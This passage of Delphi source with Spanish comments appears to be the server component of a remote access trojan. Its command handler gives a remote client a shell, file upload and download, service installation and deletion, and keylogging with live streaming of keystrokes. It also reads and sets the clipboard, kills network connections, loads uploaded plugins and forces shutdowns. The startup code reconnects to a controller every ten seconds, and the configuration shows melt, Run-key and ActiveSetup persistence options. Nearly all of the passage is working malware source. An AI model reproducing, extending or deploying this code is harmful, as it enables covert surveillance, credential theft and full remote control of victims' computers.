              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr1 := Copy(recibido, 1, Pos('|', Recibido) - 1);
              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr2 := Copy(recibido, 1, Pos('|', Recibido) - 1);
              Delete(Recibido, 1, Pos('|', Recibido));
              if TempStr2 = 'CLICKIZQ' then
                begin
                  SetCursorPos(StrToInt(TempStr), StrToInt(TempStr1));
                  mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                  mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                end
              else if TempStr2 = 'CLICKDER' then
                begin
                  SetCursorPos(StrToInt(TempStr), StrToInt(TempStr1));
                  mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                  mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                end;
            end;

          if Pos('GETFOLDER|', Recibido) = 1 then //Funcion para descarga recursiva
            begin
              Delete(recibido, 1, 10);
              Tempstr := '';
              Tempstr := ArchivosDentroDeDirectorio(Recibido);
              if (sock.Connected) then //si se le da a un directorio con muchos subdirectorios puede tardar mucho tiempo...
                sendText('GETFOLDER' + TempStr + ENTER); //Puede tardar bastante
            end;

          if Pos('GETFILE|', Recibido) = 1 then
            begin
              Delete(Recibido, 1, 8);
              Recibido := Trim(Recibido);
              ThreadInfo := TThreadInfo.Create(host, port,
                IntToStr(SH), Recibido, 'GETFILE', 0);
              //ThreadedTransfer(Pointer(ThreadInfo)); //Para debug
              BeginThread(nil,
                0,
                Addr(ThreadedTransfer),
                ThreadInfo,
                0,
                ThreadInfo.ThreadId);
            end;

          if Pos('RESUMETRANSFER|', Recibido) = 1 then
            begin
              Delete(Recibido, 1, Pos('|', Recibido));
              Recibido := Trim(Recibido);
              FilePath := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              Delete(Recibido, 1, Pos('|', Recibido));
              Recibido := Trim(Recibido);
              ThreadInfo := TThreadInfo.Create(host, port,
                IntToStr(SH), FilePath, 'RESUMETRANSFER', StrToInt(Recibido));
              BeginThread(nil,
                0,
                Addr(ThreadedTransfer),
                ThreadInfo,
                0,
                ThreadInfo.ThreadId);
            end;

          if Pos('SENDFILE|', Recibido) = 1 then
            begin
              Delete(Recibido, 1, Pos('|', Recibido));
              Recibido := Trim(Recibido);
              FilePath := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              Delete(Recibido, 1, Pos('|', Recibido));
              LocalFilePath := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //MD5 hash
              Delete(Recibido, 1, Pos('|', Recibido));

              ThreadInfo := TThreadInfo.Create(Host, Port,
                IntToStr(SH), LocalFilePath, 'SENDFILE', 0);
              ThreadInfo.RemoteFileName := FilePath;
              ThreadInfo.UploadSize := StrToInt(Recibido);
              ThreadInfo.Hash := Tempstr;
              //ThreadedTransfer(Pointer(ThreadInfo)); //Para debug
              //exit; //Para debug junto a la linea anterior
              BeginThread(nil,
                0,
                Addr(ThreadedTransfer),
                ThreadInfo,
                0,
                ThreadInfo.ThreadId);
            end;

          if Pos('SHELL|', Recibido) = 1 then
            begin
              Delete(Recibido, 1, 6);
              if Recibido = 'ACTIVAR' then
                begin
                  ShellParameters.Cliente := sock;
                  if ShellThreadID = 0 then
                    begin
                      CreateThread(nil, 0, @ShellThread, @ShellParameters, 0, ShellThreadID);
                      sendText('SHELL|ACTIVAR' + ENTER);
                    end;
                end
              else if Recibido = 'DESACTIVAR' then
                begin
                  if ShellThreadID <> 0 then
                    PostThreadMessage(ShellThreadID, WM_ACTIVATE, Length('exit'),
                      DWord(PChar('exit')));
                end
              else
                begin
                  //Entonces es un comando para escribirle a la shell
                  TempStr := '';
                  Tempstr := Recibido;
                  if ShellThreadID <> 0 then
                    PostThreadMessage(ShellThreadID, WM_ACTIVATE, Length(Tempstr),
                      DWord(PChar(Tempstr)));
                end;

            end; //if Pos('Shell', recibido) = 1

          if Recibido = 'LISTARSERVICIOS' then
            begin
              Tempstr := '';
              Tempstr := ServiceList;
              SendText('SERVICIOSWIN' + '|' + TempStr + ENTER);
            end;

          //A partir de la versi�n 1.2 estos comandos son ejecutados en otro thread diferente porque causaban que el thread de la conexi�n se congelara

          if Pos('INICIARSERVICIO', Recibido) = 1 then
            begin
              Delete(Recibido, 1, 15);
              ThreadSInfo := TThreadServiciosInfo.Create;
              ThreadSInfo.tipo := 0;
              ThreadSInfo.sService := Recibido;
              ThreadSInfo.Change := True;
              ThreadSInfo.StartStop := True;
              BeginThread(nil,
                0,
                Addr(ThreadServicios),
                ThreadSInfo,
                0,
                ThreadSInfo.ThreadId);

              //ServiceStatus(Recibido, True, True);
              SendText('MSG|{47}' + ENTER);
            end;

          if Pos('DETENERSERVICIO', Recibido) = 1 then
            begin
              Delete(Recibido, 1, 15);
              ThreadSInfo := TThreadServiciosInfo.Create;
              ThreadSInfo.tipo := 0;
              ThreadSInfo.sService := Recibido;
              ThreadSInfo.Change := True;
              ThreadSInfo.StartStop := False;
              BeginThread(nil,
                0,
                Addr(ThreadServicios),
                ThreadSInfo,
                0,
                ThreadSInfo.ThreadId);
              SendText('MSG|{48}' + ENTER);

            end;

          if Pos('BORRARSERVICIO', Recibido) = 1 then
            begin
              Delete(Recibido, 1, 14);
              ThreadSInfo := TThreadServiciosInfo.Create;
              ThreadSInfo.tipo := 1; //Borrar servicio
              ThreadSInfo.sService := Recibido;
              BeginThread(nil,
                0,
                Addr(ThreadServicios),
                ThreadSInfo,
                0,
                ThreadSInfo.ThreadId);
              //ServiceStatus(Recibido, True, False);

              SendText('MSG|{49}' + ENTER);
            end;

          if Pos('INSTALARSERVICIO', Recibido) = 1 then
            begin
              Delete(Recibido, 1, 16);
              ThreadSInfo := TThreadServiciosInfo.Create;
              ThreadSInfo.tipo := 2; //Instalar servicio
              ThreadSInfo.sService := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              Delete(Recibido, 1, Pos('|', Recibido));
              ThreadSInfo.sDisplay := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              Delete(Recibido, 1, Pos('|', Recibido));
              ThreadSInfo.sPath := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              //prueba//messageBox(0,pchar(tempstr+'|'+tempstr1+'|'+tempstr2),0,0);
              BeginThread(nil,
                0,
                Addr(ThreadServicios),
                ThreadSInfo,
                0,
                ThreadSInfo.ThreadId);
              //ServicioCrear(TempStr, TempStr1, TempStr2);
              SendText('MSG|{50}' + ENTER);
            end;

          if Recibido = 'ESTADOKEYLOGGER' then //Informa al cliente sobre el estado del keylogger y del archivo del log
            SendText('ESTADOKEYLOGGER|' + BooleanToStr(ObtenerEstadoKeylogger, 'ACTIVADO', 'DESACTIVADO') + '|' + GetKeyloggerPath + '|' + ENTER);

          if Pos('ACTIVARKEYLOGGER', Recibido) = 1 then //ACTIVARKEYLOGGER|NOMBREFILELOG|
            begin
              Delete(Recibido, 1, 17);
              Tempstr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              EmpezarKeylogger(TempStr);
              SendText('ESTADOKEYLOGGER|ACTIVADO|' + GetKeyloggerPath + '|' + ENTER);
            end;

          if Pos('DESACTIVARKEYLOGGER', Recibido) = 1 then
            begin
              PararKeylogger();
              SendText('ESTADOKEYLOGGER|DESACTIVADO|' + GetKeyloggerPath + '|' + ENTER);
            end;

          if Pos('ELIMINARLOGKEYLOGGER', Recibido) = 1 then //eLiminar el log del keylogger
            begin
              SendText('MSG|{51}' + ENTER);
              EliminarLog();
            end;

          if Pos('ONLINEKEYLOGGER', Recibido) = 1 then //Activa o desactiva el online keylogger
            begin
              Delete(Recibido, 1, 16);
              if (Copy(Recibido, 1, Pos('|', Recibido) - 1) = 'ACTIVAR') then
                begin
                  SendText('MSG|{52}' + ENTER);
                  SetOnlineKeylogger(True, sock);
                end
              else
                begin
                  SendText('MSG|{53}' + ENTER);
                  SetOnlineKeylogger(False, nil);
                end;
            end;

          //Buscar archivos y carpetas
          if Copy(Recibido, 1, 11) = 'STARTSEARCH' then
            begin
              Delete(Recibido, 1, 12);
              TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);

              ThreadSearch := TThreadSearch.Create(sock, tempstr);
              BeginThread(nil,
                0,
                Addr(threadstart),
                ThreadSearch,
                0,
                ThreadSearch.ThreadId);
            end;

          if Copy(Recibido, 1, 10) = 'STOPSEARCH' then
            begin
              StopSearch := True; //Se le manda al thread que finalice, �l se encarga de informar al cliente si acab�
            end;

          // Clipboard (basado en el codigo de The Swash)
          if Pos('GETCLIP', Recibido) = 1 then
            begin
              Delete(Recibido, 1, 7);
              Tempstr := '';
              Tempstr := GetClipBoardDatas;
              SendText('GETCLIP|' + TempStr + ENTER);
            end;

          if Pos('SETCLIP', Recibido) = 1 then
            begin
              Delete(Recibido, 1, 8);
              //Cambiamos los |saltos| por saltos de l�nea
              Recibido := StringReplace((Recibido),'|salto|', #10, [rfReplaceAll]);
              Recibido := StringReplace((Recibido),'|salto2|', #13, [rfReplaceAll]);
              TempStr := '';
              TempStr := Recibido;
              SetClipBoardDatas(PChar(TempStr));
              SendText('MSG|{54}' + ENTER);
            end;

          if Pos('GETADRIVERS', Recibido) = 1 then
            begin
              Tempstr := '';
              TempStr := DispositivosDeAudio;
              sendtext('GETADRIVERS|' + Tempstr + ENTER);
            end;
          //Comandos Relacionados con el PortScant
          if Copy(Recibido, 1, 6) = 'TCPUDP' then
            begin
              Delete(recibido, 1, 7); //Borramos TCPUDP|
              if recibido = 'FALSE' then //informaci�n simple
                SendText('TCPUDP' + DumpTCP(False, False, '') + DumpUdp(False, False, '') + '|' + ENTER)
              else //informaci�n compuesta
                SendText('TCPUDP' + DumpTCP(True, False, '') + DumpUDP(True, False, '') + '|' + ENTER);
            end;

          if Pos('TCPKILLCON', Recibido) = 1 then
            begin
              Delete(Recibido, 1, 11);
              DumpTCP(True, True, recibido);
              SendText('MSG|{55}' + ENTER);
            end;
          //Fin de comandos relacionados con el port escaner;


          if Pos('LOADPLUGIN', Recibido) = 1 then //Cargar un plugin
          begin
            Delete(Recibido, 1, 11);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Nombre
            Delete(Recibido, 1, Pos('|', Recibido));
            i := strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),0); //ID
            bool := false;
            for o:=0 to Plugincount do //miramos a ver si ya est� cargado
              if Plugins[o].Nombre = TempStr then
              begin
                SendText('PLUGINLOADED|'+inttostr(o)+'|'+ENTER);  //Estaba cargado
                bool := true;
              end;

            if ((fileexists(extractfilepath(Configuracion.sCopyTo)+TempStr) or (Plugins[PluginCount].content <> '')) and (bool = false)) then   //Lo cargamos desde el archivo
            begin
              Plugins[PluginCount].Nombre := TempStr;
              Plugins[PluginCount].id := i;

              if CargarPlugin(PluginCount, sock) then
              begin
                Plugincount := Plugincount+1;
                SendText('PLUGINLOADED|'+inttostr(i)+'|'+ENTER);  //Plugin cargado
              end;
            end
            else  
            if bool = false then
            begin
              SendText('PLUGINUPLOAD|'+inttostr(i)+'|'+ENTER);  //le avisamos para que nos lo envie
            end;
          end;

          if Pos('PLUGINUPLOAD', Recibido) = 1 then //Nos envia un plugin
          begin
            Delete(Recibido, 1, 13);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Nombre
            Delete(Recibido, 1, Pos('|', Recibido));
            o := strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),0); //tama�o
            Delete(Recibido, 1, Pos('|', Recibido));
            i := strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),0); //ID
            Delete(Recibido, 1, Pos('|', Recibido));
            TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Guardar a disco: T=si, F=no
            Delete(Recibido, 1, Pos('|', Recibido));

            if TempStr2 = 'T' then
              getFile(Sock, extractfilepath(Configuracion.sCopyTo)+TempStr+'.cp', o, false)  //Lo recibimos a un archivo con el nombre del plugin+'.cp'
            else
            begin
              buf[0] := ' ';
              while (0 <> o) and Sock.Connected do
              begin
                try
                  Sock.ReceiveBuffer(buf, SizeOf(buf));
                except
                  Plugins[PluginCount].content := '';
                  Sock.Destroy;
                  exit;
                end;
                
                if length(buf[0]) > 0 then
                begin
                  o := o-1;
                  Plugins[PluginCount].content := Plugins[PluginCount].content + (Buf[0]);
                end;
              end;
              if (0 <> o) then break; //Nos hemos desconectado
            end;
            Plugins[PluginCount].Nombre := TempStr;
            Plugins[PluginCount].id := i;

            if CargarPlugin(PluginCount, sock) then
            begin
              SendText('PLUGINLOADED|'+inttostr(i)+'|'+ENTER);  //Plugin cargado
              Plugincount := Plugincount+1;
            end;
          end;

          if Pos('PLUGINDATA', Recibido) = 1 then //Cargar un plugin
          begin
            Delete(Recibido, 1, 11);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Nombre
            Delete(Recibido, 1, Pos('|', Recibido));
            for i:=0 to Plugincount do
              if Plugins[i].nombre = TempStr then
              begin
                Plugins[i].Recdata(Recibido);
              end;

          end;

          if Pos('APAGARPC', Recibido) = 1 then
          begin
            ObtenerPrivilegioDeApagado();
            ExitWindowsEx(EWX_SHUTDOWN+EWX_FORCE,0);
          end;

          if Pos('REINICIARPC', Recibido) = 1 then
          begin
            ObtenerPrivilegioDeApagado();
            ExitWindowsEx(EWX_REBOOT+EWX_FORCE,0);
          end;

          if Pos('CERRARSESIONPC', Recibido) = 1 then
          begin
            ObtenerPrivilegioDeApagado();
            ExitWindowsEx(EWX_LOGOFF+EWX_FORCE,0);
          end;

          if Pos('SUSPENDERPC', Recibido) = 1 then
          begin
            ObtenerPrivilegioDeApagado();
            SetSystemPowerState(true,true);
          end;

          if Pos('HIBERNARPC', Recibido) = 1 then
          begin
            ObtenerPrivilegioDeApagado();
            SetSystemPowerState(false,true);
          end;

          lastCommandTime := GetTickCount;
          Busy := False;
        end; //while sock.connected do

      //Estamos desconectados as� que tenemos que desactivar la webcam y el online keylogger
      //La shell se desactiva automaticamente

      for i := 0 to Plugincount do
        if Plugins[i].StopDef then
          Plugins[i].Stop();
          
      SetOnlineKeylogger(False, nil); //Desactivamos online keylogger
      CapturaWebcam := '';
      CapturaPantalla := '';
      CapturaThumb := '';
      CapturaKeylogger := '';
      pararcapturathread := True;
      DesactivarWebcams(); //Desactivamos las webcams para que las pueda usar normalmente
      if DesinstalarServer then
        Desinstalar();
    end //try
  except
    begin
      if sock <> nil then
        begin
          if sock.Connected then
            sock.Disconnect;
          sock.Free;
          sock := nil;
          Exit;
        end; //if sock <> nil
    end //except
  end; //fin try/except block
end; //Fin del OnRead del socket

{Funci�n llamada por el conectador, nos pasa la configuraci�n como un puntero}
procedure CargarServidor(P: Pointer);
begin
  Configuracion := TSettings(P^); //Leemos la configuraci�n que nos han mandado
  if not Configuracion.bCopiarArchivo then
    Configuracion.sCopyTo := extractfilepath(paramstr(0));
  if VersionDelServer = '' then
    VersionDelServer := '1.14';

  BeginThread(nil, 0, Addr(KeepAliveThread), nil, 0, id1);
  OnServerInitKeylogger(); //Funci�n que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuraci�n lo marca
  CargarPluginsDeInicio();
  while True do
    begin
      iniciar();
      sleep(1000 * 10); //Duermo 10 seg antes de conectar de nuevo
    end;
end;

exports CargarServidor;

begin
  {$ifdef DevConfig}
  VersionDelServer                      := '';
  Configuracion.sHosts                  := 'localhost:3360�';
  Configuracion.sID                     := 'Coolserver';
  Configuracion.bCopiarArchivo          := False; //Me copio o no?
  Configuracion.sFileNameToCopy         := 'coolserver.exe';
  Configuracion.sCopyTo                 := extractfilepath(paramstr(0));
  Configuracion.bCopiarConFechaAnterior := False;
  Configuracion.bMelt                   := False;
  Configuracion.bArranqueRun            := False;
  Configuracion.sRunRegKeyName          := 'Coolserver';
  Configuracion.bArranqueActiveSetup    := False;
  Configuracion.sActiveSetupKeyName     := 'blah-blah-blah-blah';

  CargarServidor(@configuracion);
  {$endif}
end.

